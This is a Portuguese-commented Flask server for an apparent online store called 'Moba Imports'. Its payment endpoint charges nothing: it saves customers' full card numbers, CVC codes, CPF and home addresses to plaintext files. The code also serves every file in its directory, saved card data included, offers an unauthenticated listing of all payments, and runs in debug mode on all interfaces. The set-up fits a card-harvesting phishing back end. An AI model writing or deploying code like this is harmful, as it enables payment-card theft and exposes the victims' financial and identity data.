#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, send_from_directory
import json
import os
from datetime import datetime

app = Flask(__name__)

# Diretório para salvar os dados de pagamento
DADOS_DIR = 'dados_pagamentos'
if not os.path.exists(DADOS_DIR):
    os.makedirs(DADOS_DIR)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

@app.route('/salvar-pagamento', methods=['POST'])
def salvar_pagamento():
    try:
        dados = request.get_json()
        
        # Gerar nome do arquivo com timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        nome_arquivo = f'pagamento_{timestamp}.json'
        caminho_arquivo = os.path.join(DADOS_DIR, nome_arquivo)
        
        # Salvar dados no arquivo JSON
        with open(caminho_arquivo, 'w', encoding='utf-8') as f:
            json.dump(dados, f, ensure_ascii=False, indent=2)
        
        # Também salvar em formato texto legível
        nome_arquivo_txt = f'pagamento_{timestamp}.txt'
        caminho_arquivo_txt = os.path.join(DADOS_DIR, nome_arquivo_txt)
        
        with open(caminho_arquivo_txt, 'w', encoding='utf-8') as f:
            f.write("=== DADOS DO PAGAMENTO ===\n\n")
            f.write(f"Data/Hora: {dados['timestamp']}\n\n")
            
            f.write("=== PRODUTO ===\n")
            f.write(f"Nome: {dados['produto']['nome']}\n")
            f.write(f"Preço: R$ {dados['produto']['preco']:.2f}\n")
            f.write(f"Frete: R$ {dados['produto']['frete']:.2f}\n")
            f.write(f"Total: R$ {dados['produto']['total']:.2f}\n\n")
            
            f.write("=== DADOS DO CLIENTE ===\n")
            f.write(f"Nome: {dados['cliente']['nome']}\n")
            f.write(f"Email: {dados['cliente']['email']}\n")
            f.write(f"Telefone: {dados['cliente']['telefone']}\n")
            f.write(f"Endereço: {dados['cliente']['endereco']}\n")
            f.write(f"Cidade: {dados['cliente']['cidade']}\n")
            f.write(f"Estado: {dados['cliente']['estado']}\n")
            f.write(f"CEP: {dados['cliente']['cep']}\n\n")
            
            f.write("=== DADOS DO CARTÃO ===\n")
            f.write(f"Número: {dados['cartao']['numero']}\n")
            f.write(f"Nome no Cartão: {dados['cartao']['nome']}\n")
            f.write(f"Validade: {dados['cartao']['validade']}\n")
            f.write(f"CVC: {dados['cartao']['cvc']}\n")
            f.write(f"CPF: {dados['cartao']['cpf']}\n")
        
        return jsonify({
            'status': 'sucesso',
            'mensagem': 'Dados salvos com sucesso',
            'arquivo': nome_arquivo
        })
        
    except Exception as e:
        return jsonify({
            'status': 'erro',
            'mensagem': f'Erro ao salvar dados: {str(e)}'
        }), 500

@app.route('/listar-pagamentos')
def listar_pagamentos():
    """Endpoint para listar todos os pagamentos salvos"""
    try:
        arquivos = []
        if os.path.exists(DADOS_DIR):
            for arquivo in os.listdir(DADOS_DIR):
                if arquivo.endswith('.json'):
                    caminho = os.path.join(DADOS_DIR, arquivo)
                    with open(caminho, 'r', encoding='utf-8') as f:
                        dados = json.load(f)
                        arquivos.append({
                            'arquivo': arquivo,
                            'timestamp': dados['timestamp'],
                            'cliente': dados['cliente']['nome'],
                            'produto': dados['produto']['nome'],
                            'total': dados['produto']['total']
                        })
        
        # Ordenar por timestamp (mais recente primeiro)
        arquivos.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return jsonify({
            'status': 'sucesso',
            'pagamentos': arquivos
        })
        
    except Exception as e:
        return jsonify({
            'status': 'erro',
            'mensagem': f'Erro ao listar pagamentos: {str(e)}'
        }), 500

if __name__ == '__main__':
    print("=== SERVIDOR MOBA IMPORTS ===")
    print("Servidor iniciado em: http://localhost:5000")
    print("Dados de pagamento serão salvos em:", os.path.abspath(DADOS_DIR))
    print("Para listar pagamentos: http://localhost:5000/listar-pagamentos")
    print("Pressione Ctrl+C para parar o servidor")
    
    app.run(host='0.0.0.0', port=5000, debug=True)

